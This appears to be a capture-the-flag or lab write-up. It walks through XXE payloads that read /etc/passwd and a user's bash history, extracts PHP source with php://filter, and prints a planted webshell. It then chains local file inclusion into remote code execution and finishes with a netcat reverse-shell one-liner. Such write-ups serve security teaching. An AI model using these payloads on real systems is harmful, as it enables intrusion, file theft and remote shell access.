# Web Exploit

- [Web Exploit](#web-exploit)
  - [reg.php](#regphp)
    - [Observation #1](#observation-1)
      - [Exploit](#exploit)

## reg.php

### Observation #1

![picture 11](images/1cd6786d49db82c3c2c8282e2f98bc80d69ec1459c9c5802b9cd3f480c895565.png)  


Enter some information and use Burp to intercept the request:

![picture 12](images/9317040eeed9a48ea64754ae7ab1e5f5b95b877bd50bbb48126ee26b172eb7f7.png)  


The form is in XML format - could be tested against XXE injection.

<br/>

#### Exploit

Use Burp Repeater to inject a XXE payload, in attempt to dump `/etc/passwd` with the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root><name>&xxe;</name><tel>12121212</tel><email>brain@brain.com</email><password>brainyou</password></root>
```

![picture 13](images/31bad52ea97bee2955a71ad10c1f2a657d8583c19fc1104b3eb007f85cddd2bf.png)  


As shown, the content of `/etc/passwd` was dumped in the HTTP response.
- The dump shows `iyer` is a user on the web server

<br/>

Try to dump the iver's `bash_history`:
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/iyer/.bash_history"> ]>

<root><name>&xxe;</name><tel>12121212</tel><email>brain@brain.com</email><password>brainyou</password></root>
```

![picture 14](images/15dbf7b0245a3d1414e1243e903700eb94e27bfd8ff89c2274108bffc9ddbead.png)  

The bash history revealed two interesting files:
- `/var/www/html/Nuclear-Administrator.php`
- `/var/www/Remote-Administration.php`

However, `Remote-Administration.php` cannot be inspected:

![picture 15](images/63743a011d9db7c4a4374574f3937be43da9ea1cc84469fc34c2d13f7b71a3d4.png)  


<br/>

Since the web application is PHP-based, try to extract using PHP filter:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/Remote-Administration.php"> ]>
```

Select the base64 content and press `Ctrl-Shift-B` to decode:

![picture 16](images/432b2a468475ed90988f34fbee5483a26da2f4f3c3b7edf2e37d6334616292f9.png)  


The source code:
```
<?php
echo system($_GET['cmd']);
?>

<html>
<head><title>Remote Access</title></head>
<body>
<h1> Remote Access System</h1>
</body>
</html>
```
It appears that `Remote-Administrator.php` is a simple webshell.

Also inspect `/var/www/html/Nuclear-Administrator.php`:

![picture 17](images/425d88ebe03b628a07f3b37b2e2c0bb1411cbaa75f8d0421af8292ce441d13fd.png)  


The source code:
```
<?php
$file = $_GET['page'];
if(isset($file))
{
include("$file");
}
else
{
include("index.html");
}
?>
```

It shows that the parameter `page` is vulnerable to LFI.

Chaining the LFI vulnerability and webshell found, RCE can be achieved.

Payload:
```
GET /Nuclear-Administrator.php?page=/var/www/Remote-Administration.php&cmd=id
```

![picture 18](images/75049d82e1644820d249d98e059fe1fb2e890402790394f179e731b990b2a80b.png)  

Launch a netcat listner:
```
nc -nlvp 443
```

To get a reverse shell, use the following payload via Burp:

```
/Nuclear-Administrator.php?page=/var/www/Remote-Administration.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.100.11+443+>/tmp/f
```

![picture 19](images/ca2a70f6e2010d56fa6584d1374bf151b44e9f77627fe9b2870c980f065e47ad.png)  

A reverse shell calls back to the netcat listener:

![picture 20](images/8df84b419de72b1f981dbd91670ce01163373f2c12b42a380264ba28cc03752f.png)  
